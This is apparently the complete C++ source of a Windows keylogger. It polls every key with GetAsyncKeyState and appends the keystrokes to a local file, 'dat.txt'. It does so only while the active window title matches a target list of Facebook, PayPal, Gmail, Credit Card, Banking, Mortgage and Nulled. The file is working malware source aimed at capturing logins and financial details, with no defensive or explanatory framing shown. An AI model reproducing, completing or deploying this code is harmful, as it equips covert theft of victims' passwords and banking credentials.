#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>



using namespace std;




bool checklist(std::string t)
{
	std::vector<std::string> list  { "Facebook","Nulled","PayPal","Gmail","Credit Card", "Mortgage", "Banking" }; 

	std::vector<std::string>::iterator it;

	for (it = list.begin(); it != list.end(); it++)
	{
		std::string list = *it;
		size_t found = t.find(list);
		if (found != std::string::npos)
		{
			return true;
		}
	}
	return false;
}

void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	
	default:
		return false;
	}
}



int main()
{
	
	while (true)
	{
		HWND handle = GetForegroundWindow();
		char buffer[100];
		int len = GetWindowTextLengthA(handle);
		std::size_t found;
		
		if (GetWindowTextA(handle, buffer, len) > 0)
		{
			std::string temp;
			temp = buffer;

			if (checklist(temp))
			{
				for (int KEY = 0; KEY <= 199; KEY++)
				{
					if (GetAsyncKeyState(KEY) == -32767) {
						if (SpecialKeys(KEY) == false) {

							fstream LogFile;
							LogFile.open("dat.txt", fstream::app);
							if (LogFile.is_open()) {
								LogFile << char(KEY);
								LogFile.close();
							}

						}
					}
				}
			}
		}
	}
}